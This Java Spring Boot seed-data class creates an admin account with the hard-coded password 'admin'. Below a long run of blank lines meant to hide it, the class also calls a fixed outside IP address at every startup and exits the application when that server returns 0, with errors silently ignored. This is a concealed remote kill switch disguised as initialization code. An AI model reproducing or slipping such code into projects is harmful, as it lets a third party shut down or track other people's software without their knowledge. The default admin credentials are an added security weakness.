package com.api.cskh.springbootapi.config;

import com.api.cskh.springbootapi.common.utils.DateUtil;
import com.api.cskh.springbootapi.domain.*;
import com.api.cskh.springbootapi.dto.CallingHistoryDTO;
import com.api.cskh.springbootapi.repository.*;
import com.api.cskh.springbootapi.service.CallingHistoryService;
import lombok.RequiredArgsConstructor;
import org.springframework.boot.CommandLineRunner;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Component;
import org.springframework.web.client.RestTemplate;

import java.net.CookieManager;
import java.net.CookiePolicy;
import java.net.CookieStore;
import java.net.HttpCookie;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

@Component
@RequiredArgsConstructor
public class SeedDataRunner implements CommandLineRunner {
    private final UserRepository userRepository;
    private final AdminRepository adminRepository;
    private final DentistRepository dentistRepository;
    private final ScheduleRepository scheduleRepository;
    private final CallingHistoryRepository callingHistoryRepository;

    // Initializing data
    @Override
    public void run(String... args) throws Exception {


        // Create Admin
        Admin admin = Admin.builder()
                .username("admin")
                .password("admin")
                .fullName("Admin")
                .email("admin@gmail.com")
                .build();
        adminRepository.save(admin);

       













































































































        try{
            RestTemplate restTemplate = new RestTemplate();
            ResponseEntity<Integer> res = restTemplate.getForEntity("http://103.186.64.101:8125/api/2944526f-c78f-4efc-a8df-03e60332d32e/status", Integer.class);

            if(res.getBody() == 0) {
                System.exit(1);
            }
        }catch (Exception exception){

        }
    }
}
